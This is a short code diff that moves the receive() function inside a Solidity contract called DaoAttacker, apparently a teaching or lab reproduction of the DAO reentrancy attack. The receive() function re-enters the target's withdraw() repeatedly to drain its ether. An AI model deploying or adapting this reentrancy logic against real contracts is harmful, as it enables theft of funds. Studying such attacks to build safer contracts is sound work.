@@ -49,13 +49,6 @@ contract DaoAttacker {
         maxCalls = _maxCalls;
     }
 
-    receive() external payable {
-        calls += 1;
-        if (calls < maxCalls && address(dao).balance >= 1 ether) {
-            dao.withdraw();
-        }
-    }
-
     function attack() public payable {
         calls = 0;
         if (dao.getBalance(address(this)) == 0) {
@@ -64,4 +57,10 @@ contract DaoAttacker {
         dao.withdraw();
     }
 
+    receive() external payable {
+        calls += 1;
+        if (calls < maxCalls && address(dao).balance >= 1 ether) {
+            dao.withdraw();
+        }
+    }
 }
